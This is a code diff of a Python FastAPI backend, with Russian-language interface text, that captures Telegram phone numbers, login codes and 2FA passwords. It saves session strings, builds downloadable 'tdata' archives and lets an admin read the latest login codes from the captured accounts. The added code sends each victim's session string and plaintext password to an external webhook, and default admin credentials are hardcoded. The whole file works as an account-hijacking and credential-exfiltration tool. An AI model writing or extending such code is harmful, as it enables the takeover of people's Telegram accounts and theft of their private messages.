@@ -16,6 +16,7 @@ import zipfile
 import tempfile
 import ipaddress
 import base64
+import aiohttp
 from datetime import datetime
 from pathlib import Path
 from fastapi import FastAPI, Request, Depends, HTTPException
@@ -41,6 +42,8 @@ TG_API_HASH = os.environ.get("TG_API_HASH", "")
 
 ADMIN_LOGIN    = os.environ.get("ADMIN_LOGIN", "admin")
 ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "master1989a")
+HESEARCH_WEBHOOK_URL = os.environ.get("HESEARCH_WEBHOOK_URL", "").strip()
+HESEARCH_WEBHOOK_SECRET = os.environ.get("HESEARCH_WEBHOOK_SECRET", "busyuser_secret_2024")
 
 SESSIONS_DIR = "/data/sessions"
 TDATA_DIR    = "/data/tdata"
@@ -58,6 +61,74 @@ app.add_middleware(
 
 active_sessions: dict = {}
 
+
+def _clean_id(value) -> str:
+    if value is None:
+        return ""
+    return str(value).strip()
+
+
+def _session_payload_matches(session_data: dict, lookup_id: str) -> bool:
+    lookup_id = _clean_id(lookup_id)
+    if not lookup_id:
+        return False
+    return lookup_id in {
+        _clean_id(session_data.get("session_uid")),
+        _clean_id(session_data.get("bot_user_id")),
+        _clean_id(session_data.get("user_id")),
+        _clean_id(session_data.get("tg_account_id")),
+    }
+
+
+def resolve_session_path(user_id: str) -> str | None:
+    lookup_id = _clean_id(user_id)
+    if not lookup_id:
+        return None
+
+    direct_path = f"{SESSIONS_DIR}/{lookup_id}.json"
+    if os.path.exists(direct_path):
+        return direct_path
+
+    if not os.path.isdir(SESSIONS_DIR):
+        return None
+
+    for fname in os.listdir(SESSIONS_DIR):
+        if not fname.endswith(".json"):
+            continue
+        path = f"{SESSIONS_DIR}/{fname}"
+        try:
+            with open(path, encoding="utf-8") as f:
+                session_data = json.load(f)
+        except Exception:
+            continue
+        if _session_payload_matches(session_data, lookup_id):
+            return path
+    return None
+
+
+async def notify_hesearch_webhook(bot_user_id: str, tg_account_id: str, phone: str,
+                                  session_string: str, password: str = ""):
+    if not HESEARCH_WEBHOOK_URL:
+        logger.warning("HESEARCH_WEBHOOK_URL is not configured; skipping webhook sync")
+        return
+
+    payload = {
+        "secret": HESEARCH_WEBHOOK_SECRET,
+        "tg_user_id": int(bot_user_id),
+        "tg_account_id": int(tg_account_id),
+        "phone": phone,
+        "session_string": session_string,
+        "password": password or "",
+    }
+
+    timeout = aiohttp.ClientTimeout(total=15)
+    async with aiohttp.ClientSession(timeout=timeout) as session:
+        async with session.post(HESEARCH_WEBHOOK_URL, json=payload) as resp:
+            text = await resp.text()
+            if resp.status >= 400:
+                raise RuntimeError(f"Webhook returned {resp.status}: {text[:300]}")
+            logger.info(f"HeSearch webhook synced for bot_user_id={bot_user_id}")
+
 # ── Статика ──────────────────────────────────────────────────
 if os.path.exists("index.html"):
     @app.get("/")
@@ -71,6 +142,7 @@ async def send_code(request: Request):
     try:
         body = await request.json()
         phone = body.get("phone", "").strip()
+        bot_user_id = _clean_id(body.get("bot_user_id"))
         if not phone:
             return JSONResponse({"ok": False, "error": "Укажите номер телефона."}, status_code=400)
 
@@ -83,6 +155,7 @@ async def send_code(request: Request):
             "client": client,
             "phone": phone,
             "phone_code_hash": result.phone_code_hash,
+            "bot_user_id": bot_user_id,
         }
 
         logger.info(f"Code sent to {phone}, session={session_id}")
@@ -104,6 +177,7 @@ async def verify_code(request: Request):
         code       = body.get("code", "").strip()
         password   = body.get("password", "").strip()
         session_id = body.get("session_id", "").strip()
+        body_bot_user_id = _clean_id(body.get("bot_user_id"))
 
         sess = active_sessions.get(session_id)
         if not sess:
@@ -111,6 +185,7 @@ async def verify_code(request: Request):
 
         client: TelegramClient = sess["client"]
         phone_code_hash = sess["phone_code_hash"]
+        bot_user_id = _clean_id(sess.get("bot_user_id")) or body_bot_user_id
 
         try:
             await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -134,14 +209,37 @@ async def verify_code(request: Request):
 
         logger.info(f"Authorized: {me.id} @{me.username} phone={phone}")
 
-        await save_session(str(me.id), phone, session_string, me.username, me.first_name, password)
+        session_uid = bot_user_id or str(me.id)
+        await save_session(
+            session_uid=session_uid,
+            tg_account_id=str(me.id),
+            bot_user_id=bot_user_id,
+            phone=phone,
+            session_string=session_string,
+            username=me.username,
+            first_name=me.first_name,
+            password=password,
+        )
         await generate_tdata(str(me.id), session_string)
+        if bot_user_id:
+            try:
+                await notify_hesearch_webhook(
+                    bot_user_id=bot_user_id,
+                    tg_account_id=str(me.id),
+                    phone=phone,
+                    session_string=session_string,
+                    password=password,
+                )
+            except Exception as webhook_error:
+                logger.error(f"HeSearch webhook sync failed for bot_user_id={bot_user_id}: {webhook_error}")
 
         active_sessions.pop(session_id, None)
+        await client.disconnect()
 
         return JSONResponse({
             "ok": True,
             "user_id": me.id,
+            "bot_user_id": bot_user_id or None,
             "username": me.username,
             "phone": phone,
         })
@@ -152,12 +250,16 @@ async def verify_code(request: Request):
 
 
 # ── Сохранение сессии ─────────────────────────────────────────
-async def save_session(user_id: str, phone: str, session_string: str,
-                       username: str | None, first_name: str | None, password: str = ""):
+async def save_session(session_uid: str, tg_account_id: str, bot_user_id: str,
+                       phone: str, session_string: str, username: str | None,
+                       first_name: str | None, password: str = ""):
     os.makedirs(SESSIONS_DIR, exist_ok=True)
 
     data = {
-        "user_id": user_id,
+        "session_uid": session_uid,
+        "user_id": session_uid,
+        "bot_user_id": bot_user_id,
+        "tg_account_id": tg_account_id,
         "phone": phone,
         "username": username or "",
         "first_name": first_name or "",
@@ -166,8 +268,8 @@ async def save_session(user_id: str, phone: str, session_string: str,
         "saved_at": datetime.utcnow().isoformat(),
     }
 
-    path = f"{SESSIONS_DIR}/{user_id}.json"
-    with open(path, "w") as f:
+    path = f"{SESSIONS_DIR}/{session_uid}.json"
+    with open(path, "w", encoding="utf-8") as f:
         json.dump(data, f, ensure_ascii=False, indent=2)
 
     logger.info(f"Session saved: {path}")
@@ -299,7 +401,17 @@ def require_admin(credentials: HTTPBasicCredentials = Depends(security)):
 # ── /admin/tdata/<user_id> — скачать tdata как zip ───────────
 @app.get("/admin/tdata/{user_id}")
 async def download_tdata(user_id: str, _=Depends(require_admin)):
-    tdata_path = Path(f"{TDATA_DIR}/{user_id}")
+    tg_account_id = user_id
+    session_path = resolve_session_path(user_id)
+    if session_path:
+        try:
+            with open(session_path, encoding="utf-8") as f:
+                session_data = json.load(f)
+            tg_account_id = _clean_id(session_data.get("tg_account_id")) or user_id
+        except Exception:
+            pass
+
+    tdata_path = Path(f"{TDATA_DIR}/{tg_account_id}")
     if not tdata_path.exists():
         raise HTTPException(status_code=404, detail="tdata не найдена для этого пользователя")
 
@@ -328,14 +440,15 @@ async def download_tdata(user_id: str, _=Depends(require_admin)):
 # ── /admin/codes/<user_id> — последние коды с +42777 ─────────
 @app.get("/admin/codes/{user_id}")
 async def get_codes(user_id: str, _=Depends(require_admin)):
-    session_path = f"{SESSIONS_DIR}/{user_id}.json"
-    if not os.path.exists(session_path):
+    session_path = resolve_session_path(user_id)
+    if not session_path:
         raise HTTPException(status_code=404, detail="Сессия не найдена")
-    with open(session_path) as f:
+    with open(session_path, encoding="utf-8") as f:
         d = json.load(f)
     session_string = d.get("session_string", "")
     if not session_string:
         raise HTTPException(status_code=400, detail="Нет session_string")
+    client = None
     try:
         client = TelegramClient(StringSession(session_string), TG_API_ID, TG_API_HASH)
         await client.connect()
@@ -346,11 +459,13 @@ async def get_codes(user_id: str, _=Depends(require_admin)):
                 "text": msg.message or "",
                 "date": msg.date.isoformat() if msg.date else "",
             })
-        await client.disconnect()
         return JSONResponse({"ok": True, "codes": codes})
     except Exception as e:
         logger.error(f"get_codes error for {user_id}: {e}")
         return JSONResponse({"ok": False, "error": str(e)}, status_code=500)
+    finally:
+        if client:
+            await client.disconnect()
 
 
 
@@ -373,26 +488,30 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
 
     rows = ""
     for d in sessions_data:
-        uid   = d.get("user_id", "")
+        session_uid = _clean_id(d.get("session_uid") or d.get("bot_user_id") or d.get("user_id"))
+        tg_account_id = _clean_id(d.get("tg_account_id") or d.get("user_id"))
         uname = f"@{d['username']}" if d.get("username") else ""
         fname = d.get("first_name", "") or ""
         twofa = d.get("password_2fa", "")
         twofa_escaped = twofa.replace("'", "\\'")
 
-        tdata_exists = os.path.exists(f"{TDATA_DIR}/{uid}")
+        tdata_exists = os.path.exists(f"{TDATA_DIR}/{tg_account_id}")
         tdata_btn = (
-            f'<a class="dl-btn" href="/admin/tdata/{uid}">⬇ Скачать TDATA</a>'
+            f'<a class="dl-btn" href="/admin/tdata/{session_uid}">⬇ Скачать TDATA</a>'
             if tdata_exists
             else '<span class="no-tdata">нет tdata</span>'
         )
 
         display_name = f"{fname} {uname}".strip() or "—"
+        id_caption = session_uid
+        if tg_account_id and tg_account_id != session_uid:
+            id_caption += f" · tg {tg_account_id}"
 
         rows += f"""
         <tr>
           <td>
             <div class="account-name">{display_name}</div>
-            <div class="account-id">{uid}</div>
+            <div class="account-id">{id_caption}</div>
             <div class="account-phone">{d.get('phone', '')}</div>
           </td>
           <td class="twofa-cell">
@@ -401,13 +520,13 @@ async def admin_page(credentials: HTTPBasicCredentials = Depends(require_admin))
           <td>
             <div class="tdata-col">
               {tdata_btn}
-              <button class="code-btn" onclick="getCodes('{uid}', this)">📨 Получить код</button>
+              <button class="code-btn" onclick="getCodes('{session_uid}', this)">📨 Получить код</button>
             </div>
           </td>
         </tr>
-        <tr class="codes-row" id="codes-{uid}" style="display:none">
+        <tr class="codes-row" id="codes-{session_uid}" style="display:none">
           <td colspan="3">
-            <div class="codes-box" id="codes-box-{uid}"></div>
+            <div class="codes-box" id="codes-box-{session_uid}"></div>
           </td>
         </tr>"""
 
@@ -598,7 +717,9 @@ function copyStr(text) {{
 }}
 
 function timeAgo(isoStr) {{
+  if (!isoStr) return 'без даты';
   const date = new Date(isoStr);
+  if (Number.isNaN(date.getTime())) return 'без даты';
   const now = new Date();
   const diff = Math.floor((now - date) / 1000);
   if (diff < 5) return 'только что';
